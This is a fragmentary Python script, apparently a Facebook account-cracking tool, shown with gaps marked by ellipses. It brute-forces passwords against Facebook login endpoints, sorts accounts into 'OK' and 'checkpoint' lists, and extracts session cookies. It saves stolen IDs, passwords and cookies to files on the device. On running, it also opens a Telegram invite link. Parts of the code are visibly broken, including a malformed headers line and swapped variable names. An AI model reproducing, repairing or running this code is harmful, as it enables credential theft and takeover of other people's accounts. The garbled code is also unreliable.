...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print("-----------------------------------------------------")
        input("Press enter to back OWN Menu ")
        exit()
os.system('xdg-open https://t.me/+sNzWUHB7LS5kZjU1')
def DANGER():   
    os.system('clear')
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢TANJID-Cp] {idf} â€¢ {pw}\n\033[0;93[ðŸ¤Ÿ]= COOKIESâ€¢ \033[0;92m{kuki} ')     
				...
				print(f'\r\033[0;92m[TANJID-OK âž¼-OKðŸ˜»] {idf} â€¢ {pw}\n\033[0;93m[ðŸ”¥]= COOKIES â€¢ \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " TANJID,  Ok,  id"')
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);DANGERb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={OWNb};{ckkk}"
                    print(f"\r{R} [OWN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/OWN_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/OWN_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);OWNb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={DANGERb};{ckkk}"
                    print(f"\r{R} [OWN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/OWN_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/OWN_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r{A} [OWN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r\033[1;32m[OWN] \033[1;33m{loop} \033[1;32m| \033[1;34mM3 OK/CP \033[1;35m{len(oks)}/{len(cps)} | \033[1;36m{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
